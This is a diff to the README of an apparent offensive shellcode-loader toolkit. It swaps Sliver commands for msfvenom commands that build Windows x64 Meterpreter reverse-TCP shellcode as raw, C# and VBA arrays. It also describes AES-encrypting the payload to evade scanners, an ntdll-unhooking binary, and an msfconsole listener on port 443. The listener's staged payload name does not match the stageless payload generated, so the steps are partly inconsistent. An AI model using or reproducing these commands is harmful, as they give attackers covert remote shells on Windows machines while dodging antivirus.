@@ -13,20 +13,19 @@ Visual Studio (Release, x64).
 
 ## Shellcode
 
-These loaders take **raw** shellcode. Generate shellcode, then convert to a C#
-byte array:
+These loaders take **raw** shellcode. Generate it, then convert to a C# byte
+array:
 
 ```bash
-sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/sc.bin
 msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs   # paste byte[] into `buf`
 ```
 
-Or generate raw shellcode and convert to C# / VBA arrays:
+Or generate the C# / VBA array directly (no intermediate raw file):
 
 ```bash
-sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
-msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs
-msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f vba -o /tmp/sc.vba
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f vba    -o /tmp/sc.vba
 ```
 
 To keep the payload off disk/static scanners, pipe the C# array through the AES
@@ -46,5 +45,5 @@ csc /target:exe /platform:x64 /optimize+ /out:ntdll-unhook.exe ntdll-unhook.cs
 ## Listener
 
 ```bash
-sliver > mtls --lhost <IP> --lport 443
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
 ```
